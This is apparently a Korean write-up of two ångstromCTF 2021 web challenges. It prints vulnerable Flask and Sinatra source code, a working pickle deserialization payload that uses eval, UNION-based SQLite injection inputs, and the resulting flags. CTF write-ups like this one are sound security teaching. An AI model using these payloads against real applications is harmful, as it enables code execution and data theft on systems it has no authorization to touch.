## (Web) Jar [70 pts]

> Jar 문제는 Python Pickle 모듈에서 발생하는 역직렬화 RCE 취약점을 이용해 플래그를 획득하는 문제입니다.

```python
from flask import Flask, send_file, request, make_response, redirect
import random
import os

app = Flask(__name__)

import pickle
import base64

flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')

@app.route('/pickle.jpg')
def bg():
	return send_file('pickle.jpg')

@app.route('/')
def jar():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
		''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)

@app.route('/add', methods=['POST'])
def add():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	items.append(request.form['item'])
	response = make_response(redirect('/'))
	response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
	return response

app.run(threaded=True, host="0.0.0.0")
```
소스 코드를 보면 플래그는 `flag` 변수에 들어가 있는 것을 볼 수 있습니다. 그리고 index를 보면 `contentes`라는 쿠키의 값을 가져와서 `loads()` 함수의 인자 넘겨주기 때문에 역직렬화 취약점이 발생합니다. 그러니 역직렬화 취약점을 이용햇 REC를 트리거해서 템블릿 변수로 `flag` 변수를 넘겨주면 될 거 같습니다.

```python
import pickle, base64
class exploit():
    def __reduce__(self):
            return (eval, ("{flag}", ))
print(base64.b64encode(pickle.dumps(exploit())))
# b'gANjYnVpbHRpbnMKZXZhbApxAFgGAAAAe2ZsYWd9cQGFcQJScQMu'
```
위와 같이 익스 코드를 작성해주었습니다.

![](https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Jar/1.png?raw=true)

`contentes`라는 쿠키의 값으로 위 페이로드를 넘겨주니 플래그를 얻을 수 있었습니다.

```
actf{you_got_yourself_out_of_a_pickle}
```

---
## (Web) Sea of Quills [70 pts]

> Sea of Quills 문제는 SQLite Injection 문제입니다.

```ruby
require 'sinatra'
require 'sqlite3'

set :bind, "0.0.0.0"
set :port, 4567

get '/' do
	db = SQLite3::Database.new "quills.db"
	@row = db.execute( "select * from quills" )
	

	erb :index
end

get '/quills' do
	erb :quills	

end


post '/quills' do
	db = SQLite3::Database.new "quills.db"
	cols = params[:cols]
	lim = params[:limit]
	off = params[:offset]
	
	blacklist = ["-", "/", ";", "'", "\""]
	
	blacklist.each { |word|
		if cols.include? word
			return "beep boop sqli detected!"
		end
	}

	
	if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
		return "bad, no quills for you!"
	end

	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])

	p @row

	erb :specific
end
```
문제에서 소스 코드를 제공해주는데 루비인 것을 볼 수 있습니다. 코드를 보면 `cols`, `limit`, `offset`의 값을 가져와서 필터링 검증을 하고, 쿼리문 내에 넣은 후에 `execute()` 함수르 이용해서 쿼리르 실행하는 것을 볼 수 있습니다.

여기서 `union` 키워드를 필터링하지 않아 쿼리를 2개 이상 실행시켜줄 수 있을 거 같습니다. cols에 값을 `select`와 `from`에 사이에 넣어주는 것을 볼 수 있는데 만약 `sql from sqlite union select <column>`을 넣어준다면 SQL Injection을 할 수 있습니다.

![](https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/3.png?raw=true)

요청을 보내보니 `cols`의 값으로 `url`, `desc`, `name`이 넘어가는 것을 보아 이 3개가 `quills` 테이블의 존재하는 컬럼인 거 같습니다.

![](https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/1.png?raw=true)

```
limit  : 1
offset : 0
cols   : sql from sqlite_msater union select url
```
위와 같이 보내주니 메타 테이블 `sqlite_master`를 잘 참조하는 것을 볼 수 있고, 여기서 `flagtable`라는 테이블에 `flag`라는 컬럼이 존재하는 것을 알 수 있었습니다.

![](https://github.com/wjddnjs33/image/blob/main/a%CC%8AngstromCTF%202021/Sea%20of%20Quills/2.png?raw=true)

```
limit  : 1
offset : 0
cols   : flag from flagtable union select url
```
마지막을 위와 같이 `flagtable` 테이블을 참조하니 플래그가 나오는 것을 볼 수 있었습니다.

```
actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}
```

---
